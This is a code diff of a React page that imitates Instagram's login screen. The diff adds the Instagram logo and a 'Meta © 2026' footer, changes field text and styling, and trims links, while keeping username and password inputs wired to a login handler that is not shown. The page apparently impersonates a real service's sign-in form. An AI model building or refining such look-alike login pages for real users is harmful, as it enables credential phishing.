@@ -63,33 +63,29 @@ export default function InstagramLoginPage() {
       `}</style>
 
       <main>
-        <div>
+        <div className="login-wrapper">
+          <img className="logo" src="/logos/ig.png" alt="Instagram" />
           <div id="forma">
-            <h1 style={{fontSize: '1.75rem', fontWeight: 700, marginBottom: '8px', color: '#333'}}>Log in to Instagram</h1>
-            <p style={{color: '#666', fontSize: '0.95rem'}}>Stay logged in on this device</p>
+            <h1 style={{fontSize: '1.75rem', fontWeight: 700, marginBottom: '8px', color: '#262626'}}>Log in to Instagram</h1>
+            <p style={{color: '#888', fontSize: '14px'}}>Phone number, username, or email</p>
 
             <div className="form-group">
-              <input type="text" placeholder="Phone number, username, or email" value={email} onChange={(e) => setEmail(e.target.value)} />
+              <input type="text" placeholder="Username or email" value={email} onChange={(e) => setEmail(e.target.value)} />
+              <span className="field-icon">🔍</span>
             </div>
 
             <div className="form-group">
               <input type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
-              <span className="field-icon" onClick={() => setPassword(password ? '' : 'test')}>show</span>
             </div>
 
-            <button type="submit" id="login" onClick={handleLogin}>Log In</button>
+            <button id="login" type="submit" onClick={handleLogin}>Log In</button>
 
-            <div id="alert-message" style={{color: 'rgb(255, 0, 0)'}}>{feedback}</div>
-
-            <div className="orr"><p>OR</p></div>
-
-            <a href="#" style={{display: 'block', marginBottom: '12px', fontSize: '13px', color: 'rgb(85, 85, 85)'}}>Forgot password?</a>
+            <div id="alert-message" style={{color: 'rgb(244, 67, 54)'}}>{feedback}</div>
           </div>
-
-          <div className="sign-up"><p>Don't have an account? <a href="#">Sign Up</a></p></div>
-
-          <p style={{color: '#000', margin: '15px 0'}}>Get the app.</p>
         </div>
+
+        <div className="sign-up"><p>Don't have an account? Sign up</p></div>
+        <p className="footer">Meta © 2026</p>
       </main>
 
       <div className="success-overlay" id="successOverlay" aria-hidden="true">
